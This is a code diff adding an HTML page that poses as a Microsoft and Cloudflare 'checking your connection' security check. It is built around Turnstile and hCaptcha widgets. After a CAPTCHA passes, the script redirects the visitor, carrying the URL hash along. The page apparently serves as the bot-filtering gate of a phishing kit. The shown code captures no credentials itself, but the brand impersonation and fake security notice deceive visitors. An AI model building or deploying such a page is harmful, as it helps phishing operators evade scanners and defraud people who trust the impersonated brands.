@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+    <title>Test</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="robots" content="noindex,nofollow" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body class="no-js">
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1">
+                <div>
+                    <img class="" src="https://findicons.com/files/icons/2796/metro_uinvert_dock/64/microsoft_new_logo_alt.png" style="margin-bottom: -17px" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
+                    <div id="site-name">Microsoft</div>
+                </div>
+            </h1>
+            <div class="container" style="display: flex; justify-content: center;">
+                <img src="blocked-keep-getting-prompted-to-login-on-the-web-v0-olr0zn6s6c0a1.gif" alt="">
+            </div>
+            <div id="turnstileCaptcha"></div>
+            <div class="container" style="display: flex; justify-content: center;">
+                <img src="logo.png" alt="Microsoft" height="40px">
+            </div>
+            <span id="challenge-error-text"></span>
+            <noscript>
+                <div id="challenge-error-title">
+                    <div class="h2">
+                        <div class="icon-wrapper">
+                            <div class="heading-icon warning-icon"></div>
+                        </div>
+                        <span class="icon-wrapper">
+                            <div class="heading-icon warning-icon"></div>
+                        </span>
+                        <span id="challenge-error-text">Enable JavaScript and cookies to continue </span>
+                    </div>
+                </div>
+            </noscript>
+            <p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p>
+            <form action="?" method="POST" id="gForm" style="visibility: hidden">
+                <div class="h-captcha" data-sitekey="234adb2f-52ba-4697-82fa-abecbb14b173" data-callback="verifyCallback_hCaptcha"></div>
+                <br>
+            </form>
+            <form action="?" method="POST" id="cfForm" style="visibility: visible" data-callback="verifyCallback_CF">
+                <div id="turnstileCaptcha"></div>
+                <br>
+            </form>
+            <div id="challenge-body-text" class="core-msg spacer">
+                <div id="site-name" style="float: left; margin-left: 10px; margin-right: 10px">Microsoft</div>
+                <div style="margin: 10px">needs to review the security of your connection before proceeding.</div>
+            </div>
+        </div>
+    </div>
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="text-center">
+                Performance &amp; security by
+                <a rel="noopener noreferrer" href="#" target="_blank">Microsoft</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        var verifyCallback_CF = function (response) {
+            let cfForm = document.querySelector("#cfForm");
+            if (validateElement(cfForm) && response.length > 10) {
+                cfForm.remove();
+                window.location.href = "https://www.google.com" + window.location.hash;
+                return;
+            }
+            console.log("cant find cloudflare, switching to hcaptcha");
+            return switchToSecondCaptcha();
+        };
+
+        var verifyCallback_hCaptcha = function (response) {
+            let gForm = document.querySelector("#gForm");
+            if (gForm == undefined) {
+                return;
+            }
+            if (gForm.style != undefined && gForm.style.visibility != undefined) {
+                gForm.style.visibility = "hidden";
+            }
+            window.location.href = "https://www.google.com" + window.location.hash;
+        };
+
+        function validateElement(element) {
+            return element != undefined && element.style != undefined && element.style.visibility != undefined;
+        }
+
+        window.switchToSecondCaptcha = function () {
+            console.log("CAPTCHA switch callback activated");
+            let gForm = document.querySelector("#gForm");
+            if (validateElement(gForm) || gForm.style == "visible") {
+                return;
+            }
+            setTimeout(function () {
+                const cfForm = document.querySelector("#cfForm");
+                if (validateElement(cfForm) && cfForm.style.visibility != "hidden") {
+                    cfForm.remove();
+                }
+                setTimeout(function () {
+                    gForm.style.visibility = "visible";
+                }, 200);
+            }, 200);
+        };
+
+        var refreshCallBack = function (response) {
+            console.log("Refresh callback activated");
+            setTimeout(function () {
+                window.location.reload();
+            }, 1000);
+        };
+
+        window.onloadTurnstileCallback = function () {
+            turnstile.render('#myWithget', {
+                sitekey: '0x4AAAAAAAfqzm9_KK7B52xE',
+                callback: function(token) {
+                    console.log(`Challenge Success ${token}`);
+                    window.location.href = "https://www.google.com";
+                },
+            });
+        };
+
+        var incrementLoader = function () {
+            const waitp = document.querySelector("#cf-spinner-please-wait");
+            const gForm = document.querySelector("#gForm");
+            if (validateElement(gForm) && gForm.style.visibility == "hidden") {
+                waitp.textContent += ".";
+            }
+        };
+
+        setTimeout(() => {
+            let i = 0;
+            ticker = setInterval(function () {
+                i += 1;
+                incrementLoader();
+                if (i > 3) {
+                    clearInterval(ticker);
+                    return;
+                }
+            }, 1000);
+        }, 500);
+
+        setTimeout(function () {
+            const cfForm = document.querySelector("#cfForm");
+            if (!validateElement(cfForm)) {
+                switchToSecondCaptcha();
+                return;
+            }
+            const gForm = document.querySelector("#gForm");
+            if (!validateElement(gForm)) {
+                return;
+            }
+            if (cfForm.style.visibility == "visible" || gForm.style.visibility != "visible") {
+                switchToSecondCaptcha();
+            }
+        }, 7000);
+    </script>
+</body>
+</html>
